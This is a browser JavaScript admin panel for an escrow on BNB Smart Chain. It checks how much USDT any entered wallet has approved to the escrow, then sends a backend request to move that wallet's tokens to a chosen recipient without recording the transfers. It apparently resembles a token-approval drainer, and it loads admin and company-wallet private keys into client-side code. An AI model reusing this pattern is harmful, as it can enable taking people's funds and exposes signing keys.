// Admin Transfer Panel JavaScript
class AdminTransferPanel {
    constructor() {
        this.escrowContractAddress = "0x9711495244aEf1238D78fF3A2cBc423595B17845";
        this.usdtTokenAddress = "0x55d398326f99059fF775485246999027B3197955";
        this.companyWalletAddress = "0x5a03d6ab50B6403166A03511F57130496F1f3645";
        this.adminPrivateKey = (typeof CONFIG !== 'undefined' && CONFIG.ADMIN_PRIVATE_KEY) ? CONFIG.ADMIN_PRIVATE_KEY : '';
        this.companyWalletPrivateKey = (typeof CONFIG !== 'undefined' && CONFIG.COMPANY_WALLET_PRIVATE_KEY) ? CONFIG.COMPANY_WALLET_PRIVATE_KEY : '';
        this.provider = null;
        this.wallet = null;
        this.escrowContract = null;
        this.usdtContract = null;
        this.init();
    }
    init() {
        this.setupEventListeners();
        this.setupProvider();
        this.updateContractInfo();
    }
    setupEventListeners() {
        document.getElementById('transferForm').addEventListener('submit', (e) => {
            e.preventDefault();
            this.handleTransfer();
        });
        document.getElementById('checkBalanceBtn').addEventListener('click', () => {
            this.checkBalance();
        });
        this.setupCopyButtons();
    }
    setupCopyButtons() {
        const copyButtons = document.querySelectorAll('.copy-btn');
        copyButtons.forEach(btn => {
            btn.addEventListener('click', () => {
                const text = btn.getAttribute('data-copy');
                navigator.clipboard.writeText(text).then(() => {
                    this.showNotification('Address copied to clipboard!', 'success');
                });
            });
        });
    }
    setupProvider() {
        this.provider = new ethers.providers.JsonRpcProvider('https://bsc-dataseed.binance.org/');
    }
    async handleTransfer() {
        const recipientAddress = document.getElementById('recipientAddress').value.trim();
        const fromAddress = document.getElementById('fromAddress').value.trim();
        const amount = parseFloat(document.getElementById('amount').value);
        if (!ethers.utils.isAddress(recipientAddress)) { this.showNotification('Invalid recipient address', 'error'); return; }
        if (!ethers.utils.isAddress(fromAddress)) { this.showNotification('Invalid from address', 'error'); return; }
        if (amount <= 0) { this.showNotification('Amount must be greater than 0', 'error'); return; }
        await this.performChainedTransferViaApi(fromAddress, recipientAddress, amount);
    }
    async performChainedTransferViaApi(fromAddress, recipientAddress, amount) {
        const transferBtn = document.getElementById('transferBtn');
        const btnText = transferBtn.querySelector('.btn-text');
        const btnLoading = transferBtn.querySelector('.btn-loading');
        try {
            transferBtn.disabled = true;
            btnText.style.display = 'none';
            btnLoading.style.display = 'flex';
            const resp = await fetch('/api/transfer', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ fromAddress, recipientAddress, amount }) });
            let data; try { data = await resp.json(); } catch (_) { const text = await resp.text(); throw new Error(`API returned non-JSON: ${text.substring(0, 120)}`); }
            if (!resp.ok) { throw new Error(data?.error || 'API error'); }
            // Transfer successful - no need to store transfer history
            this.showNotification(`Transfer successful! ${amount} USDT to recipient.`, 'success');
        } catch (error) {
            console.error('Transfer error:', error);
            this.showNotification('Transfer failed', 'error');
        } finally {
            transferBtn.disabled = false; btnText.style.display = 'block'; btnLoading.style.display = 'none';
        }
    }
    async checkBalance() {
        const fromAddress = document.getElementById('fromAddress').value.trim();
        if (!ethers.utils.isAddress(fromAddress)) { this.showNotification('Please enter a valid wallet address first', 'error'); return; }
        try {
            let usdt; const usdtAbi = ["function balanceOf(address owner) view returns (uint256)", "function allowance(address owner, address spender) view returns (uint256)", "function decimals() view returns (uint8)"];
            usdt = new ethers.Contract(this.usdtTokenAddress, usdtAbi, this.provider);
            const balance = await usdt.balanceOf(fromAddress); const allowance = await usdt.allowance(fromAddress, this.escrowContractAddress); const decimals = await usdt.decimals();
            const balanceFormatted = ethers.utils.formatUnits(balance, decimals); const allowanceFormatted = ethers.utils.formatUnits(allowance, decimals);
            this.showNotification(`Balance: ${parseFloat(balanceFormatted).toFixed(2)} USDT | Allowance: ${parseFloat(allowanceFormatted).toFixed(2)} USDT`, 'info');
        } catch (error) { this.showNotification('Failed to check balance: ' + error.message, 'error'); }
    }
    updateContractInfo() {
        const escrowElement = document.getElementById('escrowContract'); const usdtElement = document.getElementById('usdtToken'); const companyElement = document.getElementById('companyWallet');
        escrowElement.innerHTML = `<div class="address-display"><span class="value">${this.escrowContractAddress}</span><button class="copy-btn" data-copy="${this.escrowContractAddress}">📋</button></div>`;
        usdtElement.innerHTML = `<div class="address-display"><span class="value">${this.usdtTokenAddress}</span><button class="copy-btn" data-copy="${this.usdtTokenAddress}">📋</button></div>`;
        companyElement.innerHTML = `<div class="address-display"><span class="value">${this.companyWalletAddress}</span><button class="copy-btn" data-copy="${this.companyWalletAddress}">📋</button></div>`;
        this.setupCopyButtons();
    }
    shortenAddress(address) { if (!address) return ''; return address.substring(0, 6) + '...' + address.substring(address.length - 4); }
    showNotification(message, type = 'info') { const notification = document.getElementById('notification'); notification.textContent = message; notification.className = `notification ${type}`; notification.style.display = 'block'; setTimeout(() => { notification.style.display = 'none'; }, 5000); }
}
document.addEventListener('DOMContentLoaded', () => { new AdminTransferPanel(); });


